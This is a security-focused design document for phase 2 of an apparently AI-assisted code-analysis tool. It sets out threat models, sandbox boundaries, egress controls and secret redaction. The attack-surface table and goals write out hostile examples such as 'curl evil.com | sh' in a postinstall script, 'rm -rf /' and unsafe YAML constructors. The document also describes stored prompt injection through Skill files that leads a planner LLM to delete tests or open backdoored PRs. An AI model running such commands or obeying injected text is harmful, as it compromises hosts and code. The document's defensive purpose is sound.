# Phase 02 — Context gathering — Layers B–G: Security-first design

**Lens:** Security — isolation, least privilege, audit, supply chain.
**Designed by:** Security-first design subagent
**Date:** 2026-05-14

> **Amendment note (2026-05-17 — [02-ADR-0011](ADRs/0011-tree-sitter-grammars-via-pypi-wheels.md)):** the §"`tree-sitter` grammar pinning" section (and the `_grammar_runner` subprocess proposal it sketches) describe the original security-lens design at synthesis time. The synthesizer (`final-design.md`) **rejected** the `_grammar_runner` subprocess wrap as over-engineering for the actual Phase-2 threat model — that decision is unchanged. What did change in 02-ADR-0011: the BLAKE3-of-binary verifier against `~/.codegenie/grammars.lock` (and its sibling `tools/grammars.lock` BLAKE3 pin) was replaced with **PyPI wheel + `pip --require-hashes`** as the supply-chain anchor. The wheel SHA256 pin is the new "reviewed-as-data" lock; the named-trigger C-extension discipline is preserved (Phase 1 ADR-0009 still admits `py-tree-sitter` as the one exception). Body preserved for design-time historical record; **current truth is 02-ADR-0011**.

---

## Lens summary

Phase 1 was the first phase to read adversarial repo content; Phase 2 is the first phase to **execute external unsigned binaries against that adversarial content** and to **emit findings that themselves contain secrets**. Eleven third-party CLIs enter the gather pipeline here — `scip-typescript`, `tree-sitter` grammars from `@grammar/*`, `syft`, `grype`, `trivy`, `semgrep`, `ast-grep`, `ripgrep`, `gitleaks`, `dockerfile`, `strace`/`bpftrace`. Each is a separate supply-chain dependency, each spawns subprocesses against adversarial bytes, each can phone home if not constrained, and three of them (`gitleaks`, `semgrep`, `syft`) emit output that legally contains secrets, SBOMs, and CVE chains the system is now responsible for safeguarding.

Layer C runs containers and traces them with `strace` — the gather pipeline now *runs* code from the adversarial repo (its `Dockerfile`, its `npm install` scripts, its smoke-test script). Layer D loads YAML-frontmatter Skills files from three trust tiers (`~/.codegenie/skills/`, `.codegenie/skills/`, optional org-shared); YAML is the canonical Python RCE vector and a Skill body is later inlined into a Planner prompt, so a hostile Skill is *both* an RCE primitive and a stored prompt-injection payload. Layer G's `semgrep` rule packs are *Python plugins by another name* — loading a malicious rule pack equals loading a malicious Python plugin.

The dominant threats are, in priority order: (1) **silent data exfiltration via probe-spawned subprocess egress** — registries called by `syft`/`grype`/`semgrep`, telemetry endpoints in `gitleaks`, malicious tree-sitter grammars that open sockets; (2) **probe cross-contamination and host escape** — a probe writing outside `.codegenie/`, a `strace`d binary breaking out of the container into the host, a poisoned SCIP index for repo A being served as fresh for repo B; (3) **index-freshness forgery** — an attacker manipulating mtimes or `git log` to make `IndexHealthProbe` (B2) report `high` confidence on a stale index, which silently corrupts every downstream Planner decision per ADR-0008's objective-signal model; (4) **finding-as-payload exfiltration** — a `gitleaks` hit on a real AWS key becomes a string in `repo-context.yaml`, the cache, the audit log, and the eventual PR body unless it is redacted at the chokepoint; (5) **stored prompt-injection via Skills, conventions catalog, and external docs** — Phase 3+ Planners will read these bodies, so payloads landed here detonate later.

This phase deliberately spends more performance on isolation than Phase 1: Layer C subprocesses run inside a `bubblewrap` user-namespace jail with deny-all network egress (allowlisted to the local registry only), Layer B's `tree-sitter` grammar loading goes through a pinned-hash gate, and `IndexHealthProbe` switches from mtime-based freshness to **cryptographic anchoring against the gathered `git_commit`**. ADR-0012's microVM is for transforms (Phase 5+); Phase 2 cannot wait for it, so it picks `bubblewrap` + seccomp + user namespaces as a documented "good enough until microVM exists" layer with a clear migration path.

---

## Threat model

### Assets to protect

1. **Developer/CI host integrity.** Same as Phase 1, but now expanded: eleven third-party binaries get to run. None of them may read `~/.ssh/`, `~/.aws/credentials`, `~/.config/gh/`, `~/.npmrc` (which carries `_authToken=...`), `$GITHUB_TOKEN`, `$ANTHROPIC_API_KEY`, or any env var matching `*KEY*|*TOKEN*|*SECRET*|*PASSWORD*`.
2. **Network egress posture.** The Phase 0/Phase 1 invariant ("no `httpx`/`requests`/`socket` under `src/codegenie/`") covered *Python code only*. Phase 2 introduces eleven processes that *do* speak the network natively. The new asset is the deny-by-default egress posture: `syft` does not fetch vendor advisories at gather time, `grype` does not phone the Anchore DB if a local copy is fresh, `gitleaks` does not call telemetry, `tree-sitter` grammars never open sockets, `semgrep` does not call `metrics.semgrep.dev`. Allowed destinations are a short fixed allowlist (vuln-DB mirror; internal package registry for SBOM resolution if configured).
3. **Cache integrity for derived artifacts.** Layer C builds container images and caches their digests; Layer B caches `.scip` indexes keyed by commit SHA. A cache-poisoning attack here is more dangerous than Phase 1's because the artifacts are large and opaque (a `.scip` index is a binary blob; nobody reads it). Cache keys must cover *the toolchain version* not just the input bytes, or an upgrade of `scip-typescript` silently serves stale indexes built by an older buggy version.
4. **Index-freshness honesty (ADR-0008 grounding).** `IndexHealthProbe` is the canonical "honest confidence" probe per [`CLAUDE.md`](../../../CLAUDE.md) and `localv2.md §5.2 B2`. The Planner's trust score per [ADR-0008](../../production/adrs/0008-objective-signal-trust-score.md) is "objective signals only" — and `index_health.{scip,runtime_trace,sbom,semgrep}.confidence` is one of those objective signals. **If an attacker can forge `confidence: high` on a stale index, ADR-0008's whole foundation breaks**: the gate would advance on a lie that looks objective. Therefore index health cannot rely on filesystem mtimes alone; it must anchor to the `git_commit` the index was built against, and the anchor must be tamper-resistant.
5. **Secret findings (gitleaks/semgrep p/secrets output).** A gitleaks hit on `AKIA...` is, by construction, sensitive data. The gather output now contains plaintext secret strings, file paths, and line numbers. Cache files, the audit log, and `repo-context.yaml` itself become regulated data unless redacted at the writer chokepoint. **Findings carry the secrets they found.**
6. **Skill/Convention/RepoNotes body integrity (prompt-injection substrate).** Phase 3+ Planners read these bodies. Per `localv2.md §5.4 D1–D7` and §5.6, the gatherer does *not* parse these bodies — but the gatherer is what *makes them findable*. A Skill placed at `.codegenie/skills/evil/SKILL.md` with a prompt-injection body becomes a Phase 3 RCE-equivalent (the LLM is convinced to delete tests, mark a vulnerable package as patched, or open a PR with backdoored code). The gatherer must (a) refuse to load Skills with traversal/symlink tricks, (b) record the body's BLAKE3 hash so Phase 3 can detect body-swap between gather and consume, (c) refuse YAML frontmatter that triggers any non-default constructor.
7. **Audit-trail integrity (ADR-0034 grounding).** Per [ADR-0034](../../production/adrs/0034-event-sourcing-canonical-primitive.md), every probe execution is an event in the canonical event stream — even though Phase 2 predates the Postgres event log (which lands in Phase 9). Phase 2 must emit the *event shape* now so the Phase 9 migration is mechanical and so Phase 2's audit log itself is replayable. Per [ADR-0033](../../production/adrs/0033-domain-modeling-discipline.md), events are typed Pydantic discriminated unions (`ProbeExecutionEvent` with `started`/`finished_ok`/`finished_failed`/`timed_out`/`cache_hit` variants), never `dict[str, str]` with a `kind` field.
8. **Humans-merge invariant (ADR-0009 grounding).** Per [ADR-0009](../../production/adrs/0009-humans-always-merge.md), autonomy ends at PR creation. Phase 2's contribution to that invariant is: every byte that ends up in the eventual PR evidence bundle must be traceable to a named, hashed probe execution. A `gitleaks` finding without provenance, a `runtime_trace.shared_libs_loaded` entry without a `trace_artifact_uri`, a `semgrep` finding without a rule version — these break a human reviewer's ability to verify the evidence. The audit trail is what makes the human gate tractable.

### Adversaries assumed

- **Malicious repo author (primary).** Crafts `Dockerfile` (RCE in `docker build`), `package.json` `scripts` (RCE in `npm install` at trace time), poisoned `tree-sitter` grammar references in `@grammar/` (loadable native code), oversized `.scip` files (parser DoS), recursive symlinks under `.codegenie/skills/` (escape from the Skills loader), YAML files with `!!python/object` constructors (PyYAML RCE), `gitleaks`-bait files (crashing inputs), `pnpm-lock.yaml` whose `packages` map has 10M entries (depgraph DoS in `networkx`), `tsconfig.json` `extends:` chains pointing outside the repo, certificate files with embedded scripts.
- **Malicious skill author / shared-Skills-directory compromise.** A teammate or attacker who can write to `~/.codegenie/skills-org/` (org-shared) plants a Skill that the next gather indexes, that the next planner inlines, that opens a backdoor PR. The Skills loader is a privileged surface across the team boundary.
- **Compromised third-party CLI.** A malicious version of `gitleaks` (npm/Go ecosystems both have history here) installed via the user's package manager. Phase 0's `ALLOWED_BINARIES` allowlist controls *which* binaries are invocable, not *whether the invoked binary is the one we trust*. Phase 2 adds checksum pinning for the binaries it adds.
- **Compromised tree-sitter grammar.** Grammars are native code loaded into the gather process. A malicious `tree-sitter-yaml` grammar = RCE in the process that loads it. Grammars must be hash-pinned and loaded out-of-process where the implementation supports it.
- **Hostile CI environment with shared cache.** `actions/cache` keyed on lockfile hash means PR-A's poisoned `.scip` index can be served to PR-B's run. Phase 1 addressed this for Layer A; Phase 2 must extend it to the new artifact families (`.scip`, syft JSON, grype JSON, semgrep findings, runtime traces).
- **Multi-tenant developer host.** Already addressed by Phase 0 ADR-0011 (0700/0600 modes); Phase 2 extends to `~/.codegenie/skills-org/`, `~/.codegenie/semgrep-rules/`, `~/.codegenie/ast-grep-rules/`.

**Out of scope:** physical access; kernel zero-days; compromised Python interpreter; compromise of the developer's home directory before gather runs; supply-chain compromise of pinned-and-hashed grammars or binaries between pin-time and run-time (i.e., we trust pins).

### Attack surfaces specific to this phase

| Surface | Carrier | Threat | Phase 0/1 coverage |
|---|---|---|---|
| `scip-typescript` invocation (B1) | subprocess, reads adversarial `tsconfig.json` and `node_modules/` | RCE via malicious `tsconfig.json#extends` chain pulling in attacker-controlled `tsconfig`; RCE in the indexer itself on adversarial TS | Phase 0 allowlist requires entry for `scip-typescript`; Phase 1 didn't add it |
| `tree-sitter` grammar load (B3, A1 in Phase 1) | dlopen of `@grammar/tree-sitter-*` `.so`/`.dylib` | Native-code RCE at import; pathological-input parser DoS | Phase 0 banned tree-sitter; Phase 1 also deferred it to Phase 2 |
| `IndexHealthProbe` (B2) freshness check | reads metadata from other probes' outputs + `git log` + filesystem mtimes | An attacker who can touch mtimes (or seed the cache directly) makes a stale index look fresh → `confidence: high` → ADR-0008 trust gate poisoned downstream | None — this probe doesn't exist yet |
| `docker build` (C1, C2 prereq) | runs `Dockerfile` `RUN` instructions from the repo | Arbitrary command execution by design; network egress; mount-volume tampering; container escape via known runtime CVEs | None |
| `syft` against built image (C2) | subprocess; may resolve packages against online registries | Egress to npmjs.org / registry.npmjs.com / pypi / Maven Central for SBOM resolution; telemetry; malicious image layer feeding crafted package metadata that DoSes syft | Phase 0 allowlist; no egress controls |
| `grype` against SBOM (C3) | subprocess; downloads/refreshes vulnerability DB | Egress to `toolbox-data.anchore.io`; DB cache poisoning; CVE-feed mirror trust | Phase 0 allowlist; no egress controls |
| `trivy` cross-validation (C3) | subprocess; downloads vuln DBs | Same as grype; second offline-DB to manage | Phase 0 allowlist |
| `strace -f` on the running container (C4) | ptrace attaches to PID 1 inside container | strace itself is safe; the traced binary is not — `npm install` lifecycle scripts run inside the trace target; a `postinstall` script with `curl evil.com | sh` runs at gather time | Phase 0 forbids this; no coverage |
| `bpftrace`/`bcc` (C4 optional) | requires root or `CAP_SYS_ADMIN`; loads eBPF | Privilege elevation; eBPF program from a config file = attacker-controlled kernel-resident code | None |
| `gitleaks` scan (G — by inference, listed in CLAUDE.md scope) | scans `.git/` history for high-entropy strings | Findings literally contain plaintext secrets; gitleaks itself reads attacker-crafted packed objects; some versions have phoned-home telemetry | Phase 0 allowlist; no findings-redaction |
| `semgrep` rule packs (G1) | YAML rule files; some rule features are Python-callable | Loading a malicious rule pack = loading a Python plugin; community rule packs are a supply-chain surface; egress to `metrics.semgrep.dev` enabled by default unless `--metrics=off` | Phase 0 allowlist for the binary |
| `ast-grep` rules (G2) | YAML rule files from `~/.codegenie/ast-grep-rules/` | Pattern-DoS on crafted source files; rule files become trusted code | Phase 0 allowlist |
| `ripgrep` patterns (G5) | regex patterns from a curated catalog | If the catalog itself becomes attacker-controlled (writable shared directory), arbitrary regex DoS | Phase 0 allowlist |
| Skills loader (D2) | YAML frontmatter + Markdown body from three trust tiers | PyYAML `load` → RCE; symlinks in `.codegenie/skills/` walking out to `/etc/passwd`; the body is later inlined into Planner LLM prompts → stored prompt injection | Phase 0 forbids `yaml.load`; Phase 1 deferred Skills |
| Conventions catalog (D5) | YAML rules from `~/.codegenie/conventions/*.yaml` | Same YAML surface; conventions are later rendered into `repo-context.yaml` strings → prompt-injection substrate | None |
| RepoNotesProbe (D7) | Markdown headings + paths from `.codegenie/notes/` | Body is later read by Planner → stored prompt injection; bodies are not parsed by gatherer (good), but heading extraction touches attacker-controlled markdown | None |
| ExternalDocsProbe (D8) | Confluence/Notion/HTTP fetcher | First Phase 2 probe with *outbound* network — credentials needed; SSRF if URL list is unfiltered; fetched bodies are again prompt-injection substrate | Phase 0 structural network ban; this probe is opt-in and must use a constrained client |
| Network-trace egress allow-list (C4) | the actual network the traced container is allowed to touch | If trace runs against the *real* internet, the container can phone home with secrets from any env var it inherited; the trace then claims `network_endpoints_touched: ["legit-service:5432"]` while the exfiltration was to a third destination that strace didn't bother to log because it was already over | None |
| `.codegenie/cache/` writes for B/C/G | filesystem; multi-GB SBOMs and SCIP indexes | Disk-fill DoS; symlink-to-`/etc/...` cache target; concurrent-gather races on large blobs | Phase 0 0700/0600 + atomic write; needs extension for blob mode |
| Audit log writes (per-probe events) | JSON append under `.codegenie/audit/` | Probe rewrites its own audit entry; gather wipes its tracks; secret findings logged in plaintext | Phase 0 0600 per-run file; Phase 2 needs append-only per-event with hash chain |

### Trust boundaries

```
┌───────────────────────────────────────────────────────────────────────────────┐
│                       HOST (developer or CI runner)                            │
│   $HOME, $PATH, env vars including secrets; user namespace = uid:gid           │
│   trust: SEMI-TRUSTED (own files, own creds — must not leak)                  │
│                                                                                │
│  ┌────────────────────────────────────────────────────────────────────────┐  │
│  │            codegenie process (Python, uid=user)                          │  │
│  │   trust: TRUSTED — pinned code, lockfile-verified, no net imports       │  │
│  │   sees: $HOME (filtered), code, Phase 0/1 chokepoints                   │  │
│  │                                                                          │  │
│  │   ┌──────────────────────────────────────────────────────────────────┐ │  │
│  │   │  Coordinator + Cache + Sanitizer + Writer + EventStream emitter   │ │  │
│  │   │  Skills loader (yaml.safe_load only; symlink-deny; size-cap)      │ │  │
│  │   │  Conventions loader (same)                                         │ │  │
│  │   └──────────────┬──────────────────────────┬───────────────────────┘ │  │
│  │                  │ ProbeOutput (JSON over pipe)                       │  │
│  │   ═══════════════╪══════ TRUST BOUNDARY 1: in-process barrier ═══════ │ │  │
│  │                  │                                                      │  │
│  │  ┌───────────────▼────────────────────┐  ┌────────────────────────────┐│ │
│  │  │ Layer B parser sandbox (Phase 1)    │  │ Layer D YAML loader        ││ │
│  │  │ - YAML/JSON/JSONC parsers           │  │ (in-process; defaults-deny ││ │
│  │  │ - tree-sitter (out-of-process via   │  │  Loader; size/depth caps;  ││ │
│  │  │   _grammar_runner)                  │  │  symlink-resolve-and-deny) ││ │
│  │  │ - SCIP parser (proto3, in-process)  │  └────────────────────────────┘│ │
│  │  └─────────────┬──────────────────────┘                                  │ │
│  │  ═════════════╪═══════════ TRUST BOUNDARY 2: subprocess + bwrap ════════ │ │
│  └──────────────┼──────────────────────────────────────────────────────────┘ │
│                 │                                                              │
│  ┌──────────────▼────── Layer B/G external CLIs (UNTRUSTED) ───────────────┐ │
│  │  bubblewrap + seccomp + user namespace + no-network:                     │ │
│  │    scip-typescript, syft (offline mode), grype (offline DB),             │ │
│  │    trivy, semgrep (--metrics=off), ast-grep, ripgrep, gitleaks           │ │
│  │  - read-only bind: analyzed-repo, vuln-DB cache, rule packs              │ │
│  │  - rw bind: per-probe tempdir only                                       │ │
│  │  - --share-net=no by default; --share-net=registry-only for syft if      │ │
│  │    online mode is explicitly enabled                                     │ │
│  │  - rlimits, env strip, ptrace=no, /proc constrained                      │ │
│  └──────────────────────────────────────────────────────────────────────────┘ │
│                                                                                │
│  ═══════════════════ TRUST BOUNDARY 3: container/microVM boundary ══════════  │
│  ┌──────────── Layer C runtime sandbox (UNTRUSTED — runs repo code) ───────┐ │
│  │  docker/podman with:                                                     │ │
│  │   - rootless preferred; --network=none on the trace target by default;  │ │
│  │     egress only via an explicit allowlist proxy (the gather host does   │ │
│  │     not let the traced container talk to the internet)                  │ │
│  │   - read-only image; writable /tmp tmpfs only                           │ │
│  │   - --cap-drop=ALL; --security-opt=no-new-privileges                    │ │
│  │   - strace attaches outside the container via PID-of-PID-1 from         │ │
│  │     docker inspect; ptrace cap granted only to the gather user          │ │
│  │   - tini as PID 1 inside the container so signal handling is sane       │ │
│  │  Phase 2's sandbox is bubblewrap-equivalent for *gather*; the           │ │
│  │  microVM sandbox in ADR-0012 is for *transforms* (Phase 5+) — Phase 2  │ │
│  │  documents the gap and ships the strongest "good enough" layer today.  │ │
│  └──────────────────────────────────────────────────────────────────────────┘ │
└────────────────────────────────────────────────────────────────────────────────┘

           ┌────────────── EVENT STREAM (append-only, hash-chained) ───────┐
           │ ProbeExecutionEvent variants:                                   │
           │  Started / FinishedOk / FinishedFailed / TimedOut / CacheHit  │
           │  IndexFreshnessVerified / IndexFreshnessForgeryDetected        │
           │  EgressBlocked / GrammarLoadRefused / SkillRefused             │
           │ Per [ADR-0033] typed Pydantic discriminated union; per         │
           │ [ADR-0034] same event shape Phase 9 will route to Postgres.    │
           └─────────────────────────────────────────────────────────────────┘
```

**Defense-in-depth — what each layer does and what an attacker has to defeat to reach the next:**

- **Boundary 1 (in-process barrier — inherited from Phase 1):** an attacker must produce a `ProbeOutput` JSON that passes Pydantic validation, passes the sanitizer (size/depth/path scrub), and parses as the slice schema. Defeating it requires either a Pydantic CVE or a sanitizer bypass. Mitigates: ad-hoc strings smuggling into `repo-context.yaml`, oversized payloads.
- **Boundary 2 (parser-sandbox subprocess — inherited; tree-sitter newly required):** an attacker must produce input that escapes a process with rlimits (`RLIMIT_AS=512MB`, `RLIMIT_CPU=30s`, `RLIMIT_FSIZE=64MB`), stripped env, no network, read-only cwd. For tree-sitter specifically, this layer mitigates the historical native-code-RCE risk of grammars by running grammar loads out-of-process. Defeating it requires a Python/PyYAML/jsonschema RCE inside a process with no network and no secrets, or a tree-sitter-library RCE inside an rlimited subprocess. Mitigates: parser RCE bleeding into the host.
- **Boundary 3 (bubblewrap user-namespace jail for Layer B/G external CLIs — new):** an attacker who already has RCE inside a third-party CLI (`syft`, `grype`, `gitleaks`, `semgrep`, `scip-typescript`) must escape a user-namespace + seccomp jail with `--share-net=none`. Defeating it requires a kernel CVE in user namespaces, seccomp, or the namespace setup itself. Mitigates: compromised CLI exfiltrating secrets or pivoting to the host.
- **Boundary 4 (container sandbox for Layer C runtime traces — new, but pragmatic):** an attacker who can craft a malicious `Dockerfile` or `npm postinstall` script must escape a `--cap-drop=ALL --network=none --security-opt=no-new-privileges` container running rootless. Defeating it requires a runc/containerd container-escape CVE. Mitigates: traced code phoning home with host env vars. **Acknowledged gap:** this is weaker than [ADR-0012](../../production/adrs/0012-microvm-sandbox-for-trust-gates.md)'s microVM — Phase 2 chooses container-isolation-with-rootless because ADR-0012's microVM stack is itself deferred to ADR-0019 and only mandated for Phase 5+ transforms. Phase 2 records this as an explicit gap; when ADR-0019 resolves and the microVM stack exists, Layer C's `RuntimeTraceProbe` migrates to it without API change.

The defense composition: an attacker has to get through Boundary 1 *and* Boundary 2 *and* Boundary 3 (or 4 for Layer C) to reach the host. Each is a different *kind* of barrier (validation, process isolation, kernel namespace, container) so defeating one does not automatically defeat the next.

---

## Goals (concrete, measurable)

1. **Sandbox-escape risk for Layer B/G CLIs:** zero successful escapes against an adversarial fixture corpus (≥ 30 hostile inputs: malformed `.scip`, tree-sitter pathological grammars, semgrep rule-pack RCE attempts, gitleaks crash inputs, syft package-metadata bombs, grype DB-cache poisoning). CI gates on this.
2. **Sandbox-escape risk for Layer C runtime trace:** zero observed escapes from the container into the gather host across the adversarial Dockerfile fixture corpus (≥ 10 fixtures: `RUN curl evil`, `postinstall: rm -rf /`, `ENTRYPOINT exec` shell injection, mounted-host-fs attempts, ptrace abuse, capability re-escalation). Recorded as a gap until ADR-0019 microVM stack ships and Layer C migrates.
3. **Credential blast radius:** no probe — Layer B, C, D, or G — has access to `~/.ssh`, `~/.aws`, `~/.config/gh`, `~/.npmrc` lines containing `_authToken`, or to any env var matching `*KEY*|*TOKEN*|*SECRET*|*PASSWORD*` (allowlist: `PATH`, `HOME`, `LANG`, `LC_ALL`, `TERM`, `CODEGENIE_*`). Asserted by a CI test that runs every probe under `strace -e openat` and diffs against an allowlist of paths.
4. **Network-egress posture:** zero outbound packets from any Layer B/G CLI to any destination not on the per-tool allowlist (`scip-typescript`: none; `syft`: none in default mode, configured registry only in online mode; `grype`: vuln-DB mirror only, refresh-once-per-day; `semgrep`: `--metrics=off` enforced; `gitleaks`: none; tree-sitter grammars: none). Asserted via `netstat`/`ss` polling during probe execution in CI; any non-allowlisted connection fails the build.
5. **Index-freshness honesty (ADR-0008 grounding).** `IndexHealthProbe` (B2) reports `confidence: high` *only* if (a) the index was built against the same `git_commit` recorded by the current `RepoSnapshot`, (b) the index's content hash matches the value recorded in the audit log for the build event, and (c) no source file's BLAKE3 has changed since the recorded commit. Any failure of any clause downgrades to `medium` or `low` with a structured `degradation_reason` enum. **mtime-based freshness is forbidden** and a `forbidden-patterns` pre-commit rule enforces no `os.path.getmtime` / `Path.stat().st_mtime` in `index_health.py`.
6. **Finding-redaction at the writer chokepoint.** Every finding from `gitleaks`, `semgrep p/secrets`, or any probe that emits something that pattern-matches a secret (AWS keys, GitHub tokens, JWTs, RSA blocks, generic high-entropy strings) is replaced with `<REDACTED:fingerprint=BLAKE3_8>` in the `repo-context.yaml` body, the audit log, and the cached probe output. The raw plaintext lives only at `.codegenie/findings/secrets/<fingerprint>.enc` (mode 0600, encrypted-at-rest with a per-repo key under `~/.codegenie/keys/<repo>.key`). The Planner reads the raw plaintext via an explicit `SecretFindingCapability` token (capability pattern); the LLM never sees it inline.
7. **Skills/Conventions loader hardening.** Default-deny YAML constructors only — `yaml.safe_load` for everything, never `yaml.load`; `yaml.SafeLoader` subclass with `!!python/...` constructors explicitly stripped; symlinks under any Skill/Conventions/RepoNotes directory are refused with a `SkillRefused` audit event; file size cap 256 KB per Skill body; total Skills directory budget 16 MB. Body BLAKE3 hashes are recorded in the Skills index slice so Phase 3 can detect body-swap between gather and consume.
8. **`tree-sitter` grammar pinning.** No grammar loads unless its `.so`/`.dylib` BLAKE3 matches a value recorded in `~/.codegenie/grammars.lock` (a per-grammar-pinned hash, vendored in the codegenie repo and reviewed like a lockfile). Grammar load runs out-of-process via a small `_grammar_runner` subprocess wrapper that returns parsed-AST JSON over a pipe; a malicious grammar cannot reach the gather process's memory.
9. **Audit trail (ADR-0034 grounding).** Every probe execution emits at least three typed events to an append-only JSONL log under `.codegenie/audit/events.jsonl`: `ProbeExecutionEvent.Started`, then one of `FinishedOk`/`FinishedFailed`/`TimedOut`/`CacheHit`. The log is hash-chained (each line carries `prev_hash = BLAKE3(prev_line)`) so a probe rewriting its own entry is detectable. The event schema mirrors what Phase 9 will route to Postgres per [ADR-0034](../../production/adrs/0034-event-sourcing-canonical-primitive.md). Per [ADR-0033](../../production/adrs/0033-domain-modeling-discipline.md), events are Pydantic discriminated unions; no string-typed `event_kind`.
10. **No new outbound network capability *introduced by codegenie code*.** The Phase 0/1 structural ban on `httpx`/`requests`/`socket` imports under `src/codegenie/` holds verbatim. The ExternalDocsProbe (D8) — which *does* need network — is implemented as a *separate optional subprocess* (`codegenie-fetch-external-docs`) invoked under the same bubblewrap jail as the other CLIs, with the allowlist explicitly listing the configured Confluence/Notion endpoints. The main `codegenie` process remains network-mute.

---

## Architecture

```
                              codegenie gather <path>
                                        │
                                        ▼
                       ┌────────────────────────────┐
                       │  Phase 0 CLI entry (click) │
                       │   - tool readiness now     │
                       │     checks Layer B/C/G     │
                       │     binaries + grammar     │
                       │     pinned-hash lock       │
                       └──────────────┬─────────────┘
                                      │
                                      ▼
                       ┌────────────────────────────┐
                       │  Phase 0 Coordinator       │
                       │   + per-probe Capability   │
                       │     bundle [Capability     │
                       │     pattern; see §Patterns]│
                       │   + EventStream emitter    │
                       │     [ADR-0034 shape]       │
                       │   + Sanitizer + Writer     │
                       │     (extended w/ secret-   │
                       │     redaction pass)        │
                       └──────────────┬─────────────┘
        ┌─────────────────────────────┼─────────────────────────────────┐
        │ Layer B (Semantic Index)    │                                  │
        │  B1 SCIPIndex (bwrap+CLI)   │  Layer D (Organizational)       │
        │  B2 IndexHealth (in-proc;   │   D2 SkillsIndex (in-proc;      │
        │     cryptographic anchor)   │      safe_load; symlink-deny;   │
        │  B3 NodeReflection (tree-   │      body-BLAKE3 recorded)      │
        │     sitter via _grammar_    │   D3 ADRProbe (in-proc; safe)   │
        │     runner subprocess)      │   D4 PolicyProbe (in-proc)      │
        │  B4 GeneratedCode (in-proc) │   D5 ConventionProbe (in-proc)  │
        │  B5 BuildGraph (bwrap+CLI;  │   D7 RepoNotes (in-proc; bodies │
        │     networkx in main proc   │      not parsed)                │
        │     bounded by node-count   │   D8 ExternalDocs (separate     │
        │     cap)                    │      subprocess + bwrap +       │
        │                             │      configured allowlist)      │
        ├─────────────────────────────┼─────────────────────────────────┤
        │ Layer C (Runtime/Container) │                                  │
        │  C1 Dockerfile (in-proc     │  Layer G (Behavioral+SAST)      │
        │     parser; size cap)       │   G1 Semgrep (bwrap+CLI;        │
        │  C2 SBOM (bwrap+syft;       │      --metrics=off; pinned      │
        │     offline default)        │      rule-pack hashes)          │
        │  C3 CVE (bwrap+grype/trivy; │   G2 AstGrep (bwrap+CLI)        │
        │     vuln-DB mirror; refresh │   G3 TestCoverageMapping        │
        │     <= 1×/day)              │      (in-proc; lcov parser)     │
        │  C4 RuntimeTrace (CONTAINER │   G4 InvariantHint (tree-sitter │
        │     SANDBOX — see Boundary  │      via _grammar_runner)       │
        │     4; strace from host)    │   G5 Grep (bwrap+ripgrep;       │
        │  C5 ShellUsage (in-proc     │      curated pattern catalog    │
        │     correlator over C1+C4)  │      BLAKE3-pinned)             │
        │  C6 Certificate (image FS   │                                  │
        │     read; in-proc parse)    │   gitleaks (bwrap+CLI;          │
        │  C7 Entrypoint (in-proc     │      --no-banner; offline;      │
        │     correlator)             │      findings redaction at      │
        │                             │      writer chokepoint)         │
        └─────────────────────────────┴─────────────────────────────────┘
                                      │
                                      ▼
              ┌───────────── Writer chokepoint (extended) ─────────────┐
              │  - Phase 0/1 sanitizer (size/depth/path scrub)         │
              │  - NEW: SecretRedactor (pattern + entropy + per-tool   │
              │    finding schema → <REDACTED:fingerprint=...>)        │
              │  - NEW: PromptInjectionMarker (annotate strings        │
              │    containing prompt-injection signatures; preserved   │
              │    verbatim but tagged for Phase 3 channeling)         │
              │  - NEW: per-event audit emission (hash-chained JSONL)  │
              └────────────────────────────┬───────────────────────────┘
                                           ▼
                            .codegenie/
                            ├── context/repo-context.yaml      (redacted)
                            ├── context/raw/*.json             (redacted)
                            ├── findings/secrets/<fp>.enc      (encrypted)
                            ├── audit/events.jsonl             (hash-chained)
                            ├── audit/runs/<utc-iso>.json
                            ├── cache/<key>.json + <key>.blob  (blobs for
                            │                                   syft/scip)
                            └── grammars.lock                  (BLAKE3 pins)
```

---

## Components

### Coordinator (extended)

- **Purpose:** dispatch probes; enforce per-probe Capability bundle; emit typed `ProbeExecutionEvent` to the audit stream.
- **Trust level:** trusted.
- **Interface:** unchanged ABC from Phase 0 ([ADR-0007](../../production/adrs/0007-probe-contract-preserved-poc-to-service.md)); per-probe `ProbeContext` now carries a `capabilities: ProbeCapabilities` field — a discriminated union per probe family (`InProcessCapabilities`, `SubprocessSandboxCapabilities`, `ContainerSandboxCapabilities`). Adversarial inputs: none directly; all adversarial input lives downstream of the boundary.
- **Isolation:** in-process. Owns the Capability tokens; probes receive them by parameter and cannot forge them.
- **Credentials accessed:** none (the Coordinator does not handle secrets; the Writer chokepoint does).
- **Audit emissions:** `ProbeExecutionEvent.Started` and the terminal event per probe; hash-chained.
- **Tradeoffs accepted:** one more parameter on `ProbeContext` (additive, Phase 0/1 contract preserved). The Capability discriminated union grows over time as new probe families ship — accept the growth.

### IndexHealthProbe (B2) — the critical citizen

- **Purpose:** report freshness and coverage of every other index-producing probe (`scip`, `runtime_trace`, `sbom`, `semgrep`); per `localv2.md §5.2`, this is "the single most important probe for honest confidence."
- **Trust level:** trusted (in-process, reads its own audit log; never reads adversarial bytes directly).
- **Interface:** reads the audit log's `FinishedOk` events for each upstream probe; reads the current `RepoSnapshot.git_commit`; reads cached probe-output blob hashes from `.codegenie/cache/`. **Does not read mtimes.**
- **Isolation:** in-process, runs after all other probes finish.
- **Credentials accessed:** none.
- **Audit emissions:** `IndexFreshnessVerified` (with `(scip|runtime_trace|sbom|semgrep, anchor_commit, blob_hash)` payload) per upstream probe; `IndexFreshnessForgeryDetected` when an upstream cache blob's recorded hash does not match the blob on disk (cache tampering signal).
- **Tradeoffs accepted:** freshness check is now a *cryptographic anchoring* check rather than an mtime check. Costs one BLAKE3 hash recomputation per cached blob per gather (cheap). Buys: an attacker with write access to `.codegenie/cache/` cannot make a stale index look fresh — they would need to recompute and re-record the hash chain, which requires having compromised the audit log too. **Why this matters for ADR-0008:** the trust score is "objective signals only"; `index_health.confidence` is one of those signals; if `confidence: high` is forgeable, the trust gate decides on a forgery and the Confidence-Trap exposure returns through a different door. Cryptographic anchoring is what makes `index_health.confidence` an honest objective signal.

### SkillsIndex (D2) loader

- **Purpose:** index Skills from `~/.codegenie/skills/`, `.codegenie/skills/`, optional `~/.codegenie/skills-org/`.
- **Trust level:** semi-trusted (Skills are authored by trusted humans but can be touched by anyone with write access to those dirs — three different trust tiers).
- **Interface:** YAML frontmatter + Markdown body. Adversarial inputs: malicious YAML (`!!python/object/...`), oversized bodies (multi-MB to balloon prompt context later), symlinks walking out of the Skills directory, name-collision shadowing (a `.codegenie/skills/distroless-node-generic/SKILL.md` overriding the trusted `~/.codegenie/skills/...` version).
